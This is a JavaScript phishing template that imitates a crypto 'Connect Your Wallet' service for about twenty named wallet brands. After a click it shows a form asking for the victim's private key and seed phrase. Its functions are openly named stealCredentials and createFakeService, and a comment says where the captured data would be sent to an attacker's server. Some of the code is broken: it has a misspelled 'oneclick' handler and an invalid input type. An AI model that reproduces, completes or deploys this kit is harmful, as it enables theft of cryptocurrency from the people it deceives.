const wallets = [
  "MetaMask", "Trust", "Coinbase", "crypto.com", "Blockchain", "Binance Smart Chain",
  "Safepal", "Argent", "Fortmatic", "Aktionariat", "Keyring Pro", "BitKeep",
  "SparkPoint", "OwnBit", "Infinity Wallet", "Wallet.io", "Infinito", "Torus",
  "Nash", "BitPay", "imToken"
];

function createFakeService() {
  const container = document.createElement('div');
  container.innerHTML = `
    <h2>Connect Your Wallet</h2>
    <p>Choose from our wide range of supported wallets to get started:</p>
    <div id="wallet-list"></div>
  `;
  
  const walletList = container.querySelector('#wallet-list');
  wallets.forEach(wallet => {
    const button = document.createElement('button');
    button.textContent = wallet;
    button.onclick = () => captureWalletInfo(wallet);
    walletList.appendChild(button);
  });

  document.body.appendChild(container);
}

function captureWalletInfo(wallet) {
  const fakeForm = document.createElement('div');
  fakeForm.innerHTML = `
    <h3>Connect ${wallet}</h3>
    <input type="text" placeholder="Enter your private key">
    <input type="seed phrase" placeholder="Enter 12/24 seed phrase">
    <button oneclick="stealCredentials()">Connect</button>
  `;
  document.body.innerHTML = '';
  document.body.appendChild(fakeForm);
}

function stealCredentials() {
  // Here you'd typically send the captured data to your server
  alert("Connection successful! Your wallet has been compromised.");
}

createFakeService();